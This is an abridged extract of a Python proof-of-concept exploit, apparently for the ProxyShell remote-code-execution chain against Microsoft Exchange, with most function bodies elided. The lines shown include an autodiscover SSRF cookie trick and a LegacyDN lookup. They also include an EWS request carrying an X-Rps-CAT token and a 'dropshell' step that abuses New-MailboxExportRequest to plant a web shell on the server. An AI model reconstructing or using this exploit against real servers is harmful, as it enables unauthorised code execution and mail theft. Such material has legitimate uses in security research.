# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-proxyshell-poc\proxyshell_rce.py
#!/usr/bin/env python3
#
...
class ProxyShell:
    def __init__(self, exchange_url, email, verify=False):
        ...
        self.session.headers = {"Cookie": f"Email=autodiscover/autodiscover.json?a={self.rand_email}"}
    ...
    def get_legacydn(self):
        ...
        self.legacydn = autodiscover_xml.find("{*}Response/{*}User/{*}LegacyDN").text
    ...
    def autodiscover_body(self):
        ...
        ).text = "http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"
...
def shell(command, port, proxyshell):
    ...
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        if command.lower().strip() == "dropshell":
            ...
            ps = PowerShell(pool)
            ps.add_cmdlet("New-MailboxExportRequest").add_parameter("Mailbox", proxyshell.email).add_parameter(
                "FilePath",
...
def drop_shell(proxyshell):
  ...
  <soap:Body>
    ...
    r = proxyshell.post(f"/EWS/exchange.asmx/?X-Rps-CAT={proxyshell.token}", data=data, headers=headers)
...
def main():
    ...
    proxyshell = ProxyShell(exchange_url, email)
